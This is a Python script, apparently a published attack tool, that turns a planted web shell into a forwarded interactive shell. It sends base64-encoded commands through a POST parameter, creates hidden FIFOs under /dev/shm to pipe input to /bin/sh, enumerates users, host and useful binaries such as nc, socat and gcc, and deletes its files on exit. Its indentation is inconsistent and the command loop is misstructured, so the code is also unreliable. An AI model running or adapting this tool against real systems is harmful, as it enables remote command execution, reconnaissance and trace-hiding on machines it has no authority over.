#!/usr/bin/env python3

# Libraries
import requests
import threading
import signal
import sys
import argparse
from base64 import b64encode
from random import randrange
from http.server import HTTPServer, SimpleHTTPRequestHandler

# ------------------------------------
# Github: https://github.com/D3Ext
# Instagram: @D3Ext
# Twitter: @d3ext
# Linkedin: D3Ext
# ------------------------------------

# Katana banner
global mybanner
mybanner = '''\n              /\                               ______,....----,
/VVVVVVVVVVVVVV|===================""""""""""""       ___,..-\'
`^^^^^^^^^^^^^^|======================----------""""""
              \/'''

global infile, outfile, local_http_port, server
mod = randrange(1, 9999)
local_http_port = randrange(40000, 50000)
server = HTTPServer(('localhost', local_http_port), SimpleHTTPRequestHandler)
infile = f"/dev/shm/.fs/input.{mod}"
outfile = f"/dev/shm/.fs/output.{mod}"

# Colors
class c:
	PURPLE = '\033[95m'
	BLUE = '\033[94m'
	CYAN = '\033[96m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	END = '\033[0m'
	UNDERLINE = '\033[4m'

# Ctrl + C Function
def exit_handler(sig, frame):
	print(c.BLUE + "\n\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Interrupt handler received, exiting" + c.END)
	removeFiles(url, parameter)
	server.shutdown()
	sys.exit(0)

signal.signal(signal.SIGINT, exit_handler)

# Remove input and output files at the exit
def removeFiles(url, parameter):
	removeCommand = """rm -rf /dev/shm/.fs/"""
	base64command = b64encode(removeCommand.encode()).decode()
    
	removeData = {
		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
	}
    
	print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Removing created files\n" + c.END)
	r = requests.post(url, data=removeData, timeout=2)
    
# Argument Parser Function
def parseArgs():
	p = argparse.ArgumentParser(description="D3Ext's Forwarded Shell - Interactive TTY and more")
	p.add_argument('-u', '--url', help="url of the webshell (Example: http://10.10.10.10/shell.php)", required=True)
	p.add_argument('-p', '--parameter', help="parameter of the webshell to exec commands (Example: cmd)", required=True)

	return p.parse_args()

# To check if the url receives the connections and requests
def checkConn(url):
	r = requests.get(url, timeout=5)
	if r.status_code == 200:
		print(c.BLUE + "\n[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Connection established succesfully" + c.END)
	else:
		print(c.BLUE + "\n[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Connection refused\n" + c.END)
		sys.exit(0)

# To forward a port to your localhost
def createHttp():   
	
	thread = threading.Thread(target = server.serve_forever)
	thread.daemon = True
	thread.start()
	
# Function to create the fifos on the victim (to have an interactive tty)
def createFifos(url, parameter):
	
    # Create directory with the files in /dev/shm/.fs/
	raw_command = f"""mkdir /dev/shm/.fs"""
	base64command = b64encode(raw_command.encode()).decode()
    
	fifosData = {
		f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
	}

	r = requests.post(url, data=fifosData)

	# Create input and output files under /tmp/.fs/
	try:
		raw_command = f"""mkfifo {infile}; tail -f {infile} | /bin/sh 2>&1 > {outfile}"""
		base64command = b64encode(raw_command.encode()).decode()
    
		fifosData = {
			f'{parameter}': f'echo "{base64command}" | base64 -d | bash'
		}

		print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Creating fifos on target system..." + c.END)
		r = requests.post(url, data=fifosData, timeout=2)
	except:
		None
	return None

# Function to read the file with the executed commands 
def readCommand(url, parameter):
	raw_command = f"""/bin/cat {outfile}"""
	base64command = b64encode(raw_command.encode()).decode()

	readData = {
		f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
	}

	r = requests.post(url, data=readData, timeout=2)
	return r.text
    
# Function to clear the output file with every command
def clearOutput(url, parameter):
    raw_command = f"""echo '' > {outfile}"""
    base64command = b64encode(raw_command.encode()).decode()

    clearData = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=clearData)

# Function to execute commands after creating the fifos
def execCommand(url, parameter, command):
    base64command = b64encode(command.encode()).decode()

    rce_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d > {infile}'
    }

    r = requests.post(url, data=rce_data)

# Function to check useful binaries on the victim
def checkBinaries(url, parameter):
    raw_command = """which nmap aws nc ncat netcat nc.traditional wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python3.7 perl php ruby xterm sudo docker lxc 2>/dev/null"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    return r.text

# Function to enumerate the system
def enumSys(url, parameter):
    raw_command = """whoami"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    user = r.text

    raw_command = """hostname"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    hostname = r.text

    raw_command = """hostname -I"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    ip = r.text

    raw_command = """uname -a"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    uname = r.text

    raw_command = """id"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    id_output = r.text

    raw_command = """ls /home"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    users = r.text

    raw_command = """echo $PATH"""
    base64command = b64encode(raw_command.encode()).decode()

    enum_data = {
        f"{parameter}": f'echo "{base64command}" | base64 -d | bash'
    }

    r = requests.post(url, data=enum_data)
    path = r.text

    return user, hostname, ip, uname, id_output, users, path

# Main Function
if __name__ == '__main__':

    # Parse arguments and declare variables
    parse = parseArgs()

    url = parse.url
    parameter = parse.parameter

    # Print banner
    print(c.YELLOW + mybanner + c.END)

    # Check connection to the web shell
    checkConn(url)
	createHttp()
	
    # Create an interactive shell
    createFifos(url, parameter)

    # Enumerate system
    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Getting system information..." + c.END)
    user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
    print(c.YELLOW + "\nInformation" + c.END)
    print(c.YELLOW + "-----------" + c.END)
    print(c.BLUE + "User: " + user.strip('\n') + c.END)
    print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
    print(c.BLUE + "Path: " + path.strip('\n') + c.END)
    print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
    print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
    print(c.BLUE + "Users in /home: " + users.strip('\n') + c.END)
    print(c.BLUE + "System info: " + uname.strip('\n') + c.END)
    
    binList = checkBinaries(url, parameter)
    print(c.YELLOW + "\nUseful binaries" + c.END)
    print(c.YELLOW + "---------------" + c.END)
    print(c.BLUE + binList + c.END)

    print(c.BLUE + "[" + c.END + c.YELLOW + "+" + c.END + c.BLUE + "] Type exit-shell to quit from the forwarded shell\n" + c.END)
    
	customCommands = ["dfs-enum", "enum-dfs", "dfs-exit", "exit-dfs", "dfs-forward", "forward-dfs"]
    # Loop to execute commands
	while True:
        if user == "root":
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~# ")
        else:
            command_to_exec = input(user.strip('\n') + "@" + hostname.strip('\n') + ":~$ ")
        
        if command_to_exec == "dfs-enum" or command_to_exec == "enum-dfs":
          user, hostname, ip, uname, id_output, users, path = enumSys(url, parameter)
          print(c.YELLOW + "\nInformation" + c.END)
          print(c.YELLOW + "-----------" + c.END)
          print(c.BLUE + "User: " + user.strip('\n') + c.END)
          print(c.BLUE + "ID and groups: " + id_output.strip('\n') + c.END)
          print(c.BLUE + "Path: " + path.strip('\n') + c.END)
          print(c.BLUE + "Hostname: " + hostname.strip('\n') + c.END)
          print(c.BLUE + "IP: " + ip.strip('\n') + c.END)
          print(c.BLUE + "Users in /home: " + users.strip('\n') + c.END)
          print(c.BLUE + "System info: " + uname + c.END) 
            
	if command_to_exec == "dfs-exit" or command_to_exec == "exit-dfs":
		removeFiles(url, parameter)
		print(c.BLUE + "[" + c.END + c.YELLOW + "!" + c.END + c.BLUE + "] Exiting from shell, bye!" + c.END)
		sys.exit(0)
	
	if command_to_exec not in customCommands:
		execCommand(url, parameter, command_to_exec + "\n")
		# Read command output
		resp = readCommand(url, parameter)
		# Print command output
		print(resp)
		# Clear the file of the output
		clearOutput(url, parameter)



